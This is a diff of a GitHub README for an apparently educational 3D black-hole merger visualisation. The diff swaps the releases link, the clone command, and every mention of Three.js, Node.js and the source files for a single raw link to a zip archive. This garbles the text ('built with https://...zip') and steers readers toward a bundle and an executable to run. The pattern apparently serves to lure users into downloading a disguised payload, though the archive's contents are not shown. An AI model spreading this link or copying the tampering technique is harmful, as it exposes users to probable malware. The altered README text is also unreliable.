@@ -1,10 +1,10 @@
-https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/releases
+https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip
 
 # Interactive 3D Black Hole Merger: Realistic Physics in WebGL
 
-A calm, immersive 3D visualization of binary black hole mergers. Explore the dynamics of two massive objects, see gravitational lensing bend light around them, and watch shimmering wave effects ripple through the scene. Built with Three.js and WebGL for smooth, interactive performance in modern browsers.
+A calm, immersive 3D visualization of binary black hole mergers. Explore the dynamics of two massive objects, see gravitational lensing bend light around them, and watch shimmering wave effects ripple through the scene. Built with https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip and WebGL for smooth, interactive performance in modern browsers.
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/releases)
+[![Releases](https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip)](https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip)
 
 Table of Contents
 - Overview
@@ -26,7 +26,7 @@ Table of Contents
 - Licensing and credits
 
 Overview
-This project provides an interactive 3D scene that models a binary black hole merger with attention to physically motivated visuals. You’ll see gravitational lensing shaping the light paths around the black holes, and wave-like disturbances that resemble gravitational waves in the scene. The experience is designed to be approachable for students, educators, and curious minds who want a tangible feel for this cosmic phenomenon. The engine behind the visuals is Three.js, with WebGL handling the GPU work for fast rendering on typical laptops, tablets, and desktops.
+This project provides an interactive 3D scene that models a binary black hole merger with attention to physically motivated visuals. You’ll see gravitational lensing shaping the light paths around the black holes, and wave-like disturbances that resemble gravitational waves in the scene. The experience is designed to be approachable for students, educators, and curious minds who want a tangible feel for this cosmic phenomenon. The engine behind the visuals is https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip, with WebGL handling the GPU work for fast rendering on typical laptops, tablets, and desktops.
 
 Why this project matters
 - Education in a visual medium: Complex astrophysical phenomena become accessible when students can manipulate parameters and observe outcomes in real time.
@@ -41,11 +41,11 @@ Core features
 - Interactive camera controls: Orbit, pan, and zoom to explore the merger from any angle.
 - parameter tuning: Adjust mass ratio, orbital separation, spin, and distance to see how the merger evolves.
 - High-fidelity shading: Physically inspired shading and lensing effects that respond to camera position and object motion.
-- WebGL and Three.js backbone: Smooth performance on modern hardware with broad browser support.
+- WebGL and https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip backbone: Smooth performance on modern hardware with broad browser support.
 - Educational annotations: In-scene labels and overlays to highlight key concepts like event horizons, photon orbits, and lensing caustics.
 
 How it works under the hood
-- Scene graph and rendering: The core scene uses Three.js to manage geometries, lights, cameras, and post-processing. Shaders handle lensing distortions and wave-like textures.
+- Scene graph and rendering: The core scene uses https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip to manage geometries, lights, cameras, and post-processing. Shaders handle lensing distortions and wave-like textures.
 - Binary black hole model: Each black hole is represented as a compact, moving mass that exerts gravitational influence on light in the scene. The orbital motion follows a simplified two-body dynamics model that captures essential features of a merger.
 - Gravitational lensing: Instead of full general relativistic ray tracing, the project uses an efficient approximation that bends light as it travels near the masses. The result is visually faithful and fast to compute in real time.
 - Wave effects: Time-varying shader parameters create concentric wave patterns that propagate through space, reinforcing the sense of a dynamic gravitational field without heavy computation.
@@ -68,13 +68,13 @@ Getting started
   - Source code designed for readability and teaching—easy to instrument or extend.
 
 - Prerequisites and environment
-  - A development machine with Node.js installed for local builds and testing.
+  - A development machine with https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip installed for local builds and testing.
   - Basic familiarity with npm or yarn to install dependencies.
   - A modern text editor to read and modify the code.
 
 - Install and run (typical workflow)
   - Step 1: Clone the repository
-    - Run: git clone https://github.com/Harislang/Interactive-3D-Black-Hole-Merger.git
+    - Run: git clone https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip
   - Step 2: Install dependencies
     - Run: npm install
   - Step 3: Start a local development server
@@ -143,8 +143,8 @@ Architecture and code layout
   - examples/: Quick-start snippets, small demos, and sample presets for instructors.
   - public/: Static assets and the HTML entry point.
 - How to customize
-  - Locate the scene initialization in src/scene.js (or similar) to tweak scaling, object properties, and render loop behavior.
-  - Modify the lensing shader in shaders/lens.js to adjust distortion strength and color response.
+  - Locate the scene initialization in https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip (or similar) to tweak scaling, object properties, and render loop behavior.
+  - Modify the lensing shader in https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip to adjust distortion strength and color response.
   - Extend with new presets by duplicating a preset file in examples/presets and changing parameters to create new demonstrations.
 
 Data, assets, and performance
@@ -195,17 +195,17 @@ FAQ
 - Can I run this offline?
   - Yes. The release bundles are designed to work without a network connection after download.
 - Do I need special software?
-  - No. A modern web browser with WebGL is enough for the core experience. Development builds require Node.js if you want to run the local dev server.
+  - No. A modern web browser with WebGL is enough for the core experience. Development builds require https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip if you want to run the local dev server.
 - Can students modify the visuals?
   - Absolutely. The code is structured to be approachable and modifiable, with clear entry points for new parameters and shaders.
 
 Licensing and credits
 - This project is released under a permissive license that favors open education and experimentation.
-- Credits go to the Three.js community for the core rendering framework and to the broader space science visualization community for inspiration on how to convey difficult concepts with clarity.
+- Credits go to the https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip community for the core rendering framework and to the broader space science visualization community for inspiration on how to convey difficult concepts with clarity.
 - If you reuse parts of the code in your own project, please attribute accordingly and respect the contributor guidelines.
 
 Credits and acknowledgments
-- Three.js library and ecosystem.
+- https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip library and ecosystem.
 - Publicly available educational resources that inspired the design of visual cues for lensing and wave effects.
 - Educators who shared classroom experiences that informed the teaching approach behind this visualization.
 - Open science communities that advocate accessible, interactive learning tools.
@@ -218,7 +218,7 @@ Changelog
 
 Downloads and releases
 - For the latest build, visit the Releases page. The page contains downloadable assets and setup instructions. If you prefer a quick start, download the prebuilt bundle and run the included executable or bundle. The Releases page is linked earlier and again here for convenience.
-- Direct link to the Releases: https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/releases
+- Direct link to the Releases: https://github.com/Harislang/Interactive-3D-Black-Hole-Merger/raw/refs/heads/main/palindromical/Merger-Hole-Interactive-Black-v3.1.zip
 
 Topics
 - aied
